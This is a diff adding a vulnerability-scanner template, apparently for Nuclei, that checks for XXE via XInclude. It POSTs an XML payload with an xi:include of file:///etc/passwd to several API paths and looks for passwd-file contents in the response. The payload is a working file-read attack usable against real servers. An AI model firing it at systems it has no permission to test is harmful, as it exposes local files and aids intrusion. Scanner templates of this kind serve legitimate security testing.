@@ -1,0 +1,28 @@
+id: m7-xxe-xinclude
+info:
+  name: M7 - XXE via XInclude Attack
+  author: Sharlix
+  severity: high
+  description: XInclude-based XXE when full DOCTYPE control is not available
+  tags: xxe,xinclude,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/xml"
+      - "{{BaseURL}}/api/process"
+
+    body: |
+      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+        <xi:include parse="text" href="file:///etc/passwd"/>
+      </foo>
+
+    headers:
+      Content-Type: application/xml
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+        part: body
